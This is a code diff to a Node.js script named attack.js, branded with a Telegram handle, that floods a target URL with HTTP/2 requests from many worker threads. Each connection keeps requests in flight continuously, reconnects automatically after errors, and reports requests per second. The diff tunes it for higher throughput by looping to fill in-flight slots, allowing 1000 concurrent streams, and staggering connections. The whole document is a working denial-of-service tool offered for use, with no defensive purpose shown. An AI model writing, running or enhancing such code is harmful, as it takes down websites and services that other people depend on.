@@ -16,6 +16,8 @@ let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
 
+const LOCAL_PORT = Math.floor(10000 + Math.random() * 50000);
+
 if (isMainThread) {
     if (process.argv.length < 4) {
         console.error('Usage: node attack.js <target> <duration_secs>');
@@ -28,17 +30,20 @@ if (isMainThread) {
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
     console.log(`SHARKV3! - NO CPU WARMUP .exx`);
+    console.log(`PORT: ${LOCAL_PORT}`);
 
-    
     for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: true } });
+        new Worker(__filename, {
+            workerData: { target, duration, initial: true, port: LOCAL_PORT }
+        });
     }
 
     for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: false } });
+        new Worker(__filename, {
+            workerData: { target, duration, initial: false, port: LOCAL_PORT }
+        });
     }
 
-    // Live Stats
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
@@ -65,19 +70,19 @@ if (isMainThread) {
             else if (msg === 'err') errorCount++;
         });
     });
-    server.listen(9999);
+    server.listen(LOCAL_PORT);
 } else {
-    const { target, duration, initial } = workerData;
+    const { target, duration, initial, port } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
 
-    const socket = net.connect(9999, '127.0.0.1');
+    const socket = net.connect(port, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
     function sendLoop(client, inflight) {
         if (Date.now() > end || client.destroyed) return;
 
-        if (inflight.count < MAX_INFLIGHT) {
+        while (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
                 const req = client.request({ ':method': 'GET', ':path': '/' });
@@ -100,35 +105,41 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
+        setTimeout(() => sendLoop(client, inflight), 5); // smooth burst
     }
 
     function createConnection() {
         if (Date.now() > end) return;
 
-        let client;
         try {
-            client = http2.connect(target);
+            const client = http2.connect(target, {
+                settings: {
+                    enablePush: false,
+                    maxConcurrentStreams: 1000,
+                }
+            });
 
             const inflight = { count: 0 };
 
             client.on('error', () => {
                 client.destroy();
-                setTimeout(createConnection, 100); // auto-recover fast
+                setTimeout(createConnection, 100);
             });
 
             client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, 100));
 
             client.on('connect', () => {
-                for (let i = 0; i < 150; i++) sendLoop(client, inflight); // boosted request flow
+                for (let i = 0; i < 120; i++) {
+                    setTimeout(() => sendLoop(client, inflight), i * 5);
+                }
             });
         } catch {
-            setTimeout(createConnection, 100);
+            setTimeout(createConnection, 200);
         }
     }
 
     for (let i = 0; i < connections; i++) {
-        createConnection();
+        setTimeout(createConnection, i * 10);
     }
 }
